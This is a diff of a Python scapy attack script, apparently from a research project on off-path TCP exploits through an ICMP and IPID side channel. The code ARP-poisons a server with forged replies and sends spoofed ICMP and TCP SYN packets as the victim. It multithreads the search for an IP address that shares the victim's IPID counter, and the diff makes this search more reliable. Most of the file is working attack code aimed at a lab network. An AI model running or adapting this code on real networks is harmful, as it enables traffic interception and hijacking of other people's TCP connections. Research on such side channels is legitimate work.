@@ -4,33 +4,40 @@ import struct
 import threading
 from scapy.all import *
 from scapy.layers.inet import *
+from scapy.layers.l2 import *
 
 """
     @CreateDate:    2020/1/22
     @Group:         Off-Path TCP Exploit Via ICMP
                     and IPID Side-Channel
     @Project:       Work2
-    @Filename:      parallel_check.py
+    @Filename:      collision_find.py (renamed)
     @Brief:         This program is used for finding a collision IP address. This 
                     means target ip address will share its IPID counter with victim 
                     when they interact with Mallory.
                     This program is different form single_check while this program 
                     utilizes multi-thread to check the potential address concurrently.
-    @Modify:        
+    @Modify:        2020/2/1    Kevin.F:    Change scapy version 2.4.3
+                    2020/2/1    Kevin.F:    Adjust import at line 7
+                    2020/2/1    Kevin.F:    For ARP poison, add started-callback
+                    2020/2/1    Kevin.F:    IPID as a critical resource
+                    2020/2/2    Kevin.F:    Change ARP poison logic
+                    2020/2/5    Kevin.F:    Change collision check logic as send-sniff style
 """
 
-forge_ip_prefix = '100.100.'                # used for construct a address pool
-victim_ip = '100.100.128.2'                 # victim ip address
-server_ip = '100.100.128.3'                 # server ip address
-server_mac_addr = '00:0c:29:ac:09:a4'       # mac address of server used for ARP poison
-my_mac_addr = get_if_hwaddr('ens33')        # mac address of Mallory
+forge_ip_prefix = '10.10.'                  # used for construct a address pool
+victim_ip = '10.10.100.1'                   # victim ip address
+server_ip = '10.10.100.2'                   # server ip address
+server_mac_addr = '00:0c:29:20:f4:8c'       # mac address of server used for ARP poison
+my_mac_addr = get_if_hwaddr('ens33')        # mac address of attacker
 z_payload = b''                             # full-zero byte string used for padding
 NUM_T = 20                                  # number of checking thread
 
 # Critical Resource
 semaphore = threading.Semaphore(1)          # write-lock semaphore
+semaphore_ipid = threading.Semaphore(1)     # semaphore for IPID (prevent oblivious collision)
 num1 = 2                                    # '100.100.' + num1
-num2 = 3                                    # '100.100.num1.' + num2
+num2 = 2                                    # '100.100.num1.' + num2
 found = False                               # collision address has been found?
 result = 'no result'                        # collision result
 
@@ -47,54 +54,60 @@ result = 'no result'                        # collision result
                 IP address in the pool. 
 """
 def arp_inject(forged_ip):
-    symbol = False
-    while symbol == False:
-        # here we send a UDP packet to allure server to execute ip/mac convert
-        send(IP(src=forged_ip, dst=server_ip) /
-             UDP(dport=1371),
+    # here we send a UDP packet to allure server to execute ip/mac convert
+    # if we got no reply, we can deduce that arp poisoned before is not expired now
+    pkt = sniff(filter="arp " + "and dst " + forged_ip + " and ether src " + server_mac_addr,
+                iface='ens33', count=1, timeout=0.3, started_callback=
+                lambda: send(IP(src=forged_ip, dst=server_ip) / UDP(dport=80),
+                             iface='ens33', verbose=False))
+    if len(pkt) == 1 and pkt[0][1].fields['psrc'] == server_ip and pkt[0][1].fields['pdst'] == forged_ip:
+        send(ARP(pdst=server_ip, hwdst=server_mac_addr, psrc=forged_ip, hwsrc=my_mac_addr, op=2),
              iface='ens33', verbose=False)
-
-        # then we sniff the ARP request message, and then send the poisonous ARP reply
-        pkt = sniff(iface='ens33', filter="arp and (dst host " + forged_ip + ")", count=1, timeout=2)
-
-        if len(pkt) == 1 and pkt[0][1].fields['psrc'] == server_ip and pkt[0][1].fields['pdst'] == forged_ip:
-            symbol = True
-            send(ARP(pdst=server_ip, hwdst=server_mac_addr, psrc=forged_ip, hwsrc=my_mac_addr, op=2),
-                 iface='ens33', verbose=False)
 
 
 """
     @Date:      2020/1/19
     @Author:    Kevin.F
     @Param:     forged_ip ->  The forged ip address which we are checking collision now.
-    @Return:    True ->       The param forged_ip maybe a collision address.
-                False ->      The param forged_ip must not be a collision.
+                D         ->  Number of checking routine. Higher D means higher confidence.
+    @Return:    True      ->  The param forged_ip maybe a collision address.
+                False     ->  The param forged_ip must not be a collision.
     @Brief:     This function is used for checking whether forged_ip is a collision.
                 This function follow the step in slide (page 10,11).
                 This function CAN NOT make sure an address is a collision with 100% sure,
                 because the increment rule of the counters.
 """
-def check_collision(forged_ip):
+def check_collision(forged_ip, D):
     negative = 0
     # repeat the test N times to counter uncertainty
-    for i in range(0, 4):
+    for i in range(0, D):
         # Note. we must use one sr() to send all three packets to reduce
         # the delay, and try to make sure the counter add only 1
         # Note. there must be a service on dst port. Because we want server
         # to reply a SYN-ACK rather than a RST
-        ans, uans = sr([
-            IP(src=forged_ip, dst=server_ip) / ICMP(),
-            IP(src=victim_ip, dst=server_ip) / TCP(sport=RandShort(), dport=22, flags='S'),
-            IP(src=forged_ip, dst=server_ip) / ICMP()
-        ], iface='ens33', verbose=False)
+        semaphore_ipid.acquire()
+        pkts = sniff(filter="icmp and dst " + forged_ip,
+                    iface='ens33', count=2, timeout=0.2, started_callback=
+                    lambda: send([
+                            IP(src=forged_ip, dst=server_ip) / ICMP(),
+                            IP(src=victim_ip, dst=server_ip) / TCP(sport=RandShort(), dport=22, flags='S'),
+                            IP(src=forged_ip, dst=server_ip) / ICMP()
+                            ], iface='ens33', verbose=False))
+        semaphore_ipid.release()
 
-        ipid1 = ans.res[0][1].fields['id']
-        ipid2 = ans.res[-1][1].fields['id']
+        if len(pkts) == 2:
+            ipid1 = pkts[0][1].fields['id']
+            ipid2 = pkts[1][1].fields['id']
 
-        if (ipid2 - ipid1) >= 2:
-            negative += 1
+            if abs(ipid2 - ipid1) >= 2:
+                negative += 1
+            else:
+                break
 
-    if negative == 4:
+        else:
+            i -= 1
+
+    if negative == D:
         return True
     else:
         return False
@@ -140,9 +153,9 @@ def check_new():
          z_payload,
          iface='ens33', verbose=False)
 
-    if check_collision(forge_ip):
+    if check_collision(forge_ip, 1):
         # when an address is suspected of collision, we check it again and again
-        if check_collision(forge_ip) and check_collision(forge_ip):
+        if check_collision(forge_ip, 1) and check_collision(forge_ip, 2) and check_collision(forge_ip,8):
             semaphore.acquire()
             result = forge_ip
             found = True
@@ -152,7 +165,7 @@ def check_new():
         # print(forge_ip + ' no Collision.')
         pass
 
-    # invoke another thread agin
+    # invoke another thread again
     t = threading.Thread(target=check_new)
     t.start()
 
